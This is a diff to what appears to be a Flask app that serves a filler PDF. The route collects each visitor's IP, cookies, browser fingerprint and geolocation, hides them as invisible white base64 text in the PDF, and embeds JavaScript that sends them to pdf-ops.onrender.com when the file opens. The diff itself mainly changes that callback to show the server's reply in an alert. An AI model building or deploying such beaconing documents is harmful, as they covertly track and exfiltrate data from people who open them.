@@ -209,11 +209,11 @@ def download():
     # Retrieve the IP address; if multiple IPs are present, take the first one.
     ip_header = request.headers.get('X-Forwarded-For', request.remote_addr)
     ip = ip_header.split(",")[0].strip() if ip_header else request.remote_addr
-    
+
     user_agent = request.headers.get('User-Agent', 'unknown')
     cookies = request.cookies
     tls_metadata = request.environ.get('wsgi.url_scheme')
-    
+
     # Retrieve client-side data from the form submission.
     client_data = {
         'screenWidth': request.form.get('screenWidth'),
@@ -239,13 +239,13 @@ def download():
         'downlink': request.form.get('downlink'),
         'plugins': request.form.get('plugins')
     }
-    
+
     # Fetch geolocation data via ipinfo.io and store the entire JSON response.
     lat, lon, geo_data = get_ip_geolocation(ip)
     client_data['latitude'] = lat if lat is not None else ""
     client_data['longitude'] = lon if lon is not None else ""
     client_data['ip_geolocation'] = geo_data  # Entire JSON from ipinfo.io
-    
+
     # Create a comprehensive log message.
     log_message = {
         'ip': ip,
@@ -257,12 +257,12 @@ def download():
         'tls_metadata': tls_metadata
     }
     logging.info(json.dumps(log_message))
-    
+
     # --- Steganographic Embedding with Markers ---
     # Encode the complete log_message in base64 and wrap it with markers.
     encoded_log = base64.b64encode(json.dumps(log_message).encode('utf-8')).decode('utf-8')
     encoded_log_with_markers = "<<BASE64 START>>" + encoded_log + "<<BASE64 END>>"
-    
+
     # Generate a PDF using ReportLab and Faker.
     buffer = BytesIO()
     p = canvas.Canvas(buffer)
@@ -276,18 +276,19 @@ def download():
     text_object = p.beginText(100, 670)
     text_object.textLines(fake_text)
     p.drawText(text_object)
-    
+
     # Render the hidden payload in white, extremely small text.
     p.setFont("Helvetica", 1)
     p.setFillColorRGB(1, 1, 1)  # White text on white background (invisible)
     p.drawString(1, 1, encoded_log_with_markers)
-    
+
     p.showPage()
     p.save()
     buffer.seek(0)
-    
+
     # --- Enhanced Multi-Stage Logging via Embedded JavaScript ---
-    # The embedded JavaScript defines a variable with the hidden payload and attempts a callback to your hosted endpoint.
+    # The embedded JavaScript now defines a variable with the hidden payload, attempts a callback,
+    # and uses the onload event to display the response in an alert.
     try:
         pdf_reader = PyPDF2.PdfReader(buffer)
         pdf_writer = PyPDF2.PdfWriter()
@@ -299,9 +300,14 @@ def download():
         try {{
             var req = new XMLHttpRequest();
             req.open("GET", "https://pdf-ops.onrender.com/pdf_callback?data=" + encodeURIComponent(hiddenPayload), true);
+            req.onload = function() {{
+                // Display the server's response in an alert.
+                app.alert("Callback result: " + req.responseText);
+            }};
             req.send();
-        }} catch(e) {{}}
-        app.alert("PDF opened. This event has been logged.");
+        }} catch(e) {{
+            app.alert("Error in callback: " + e);
+        }}
         """
         pdf_writer.add_js(js_code)
         new_buffer = BytesIO()
@@ -313,7 +319,7 @@ def download():
         # If JavaScript embedding fails, fall back to the original PDF.
         final_pdf = buffer
     # --- End of JavaScript Embedding ---
-    
+
     # Send the final PDF as a file download.
     return send_file(final_pdf, as_attachment=True, download_name='sample.pdf', mimetype='application/pdf')
 
@@ -334,7 +340,7 @@ def display_logs():
             logs = f.read()
     except Exception as e:
         logs = f"Error reading log file: {e}"
-    
+
     logs_html = """
     <!DOCTYPE html>
     <html>
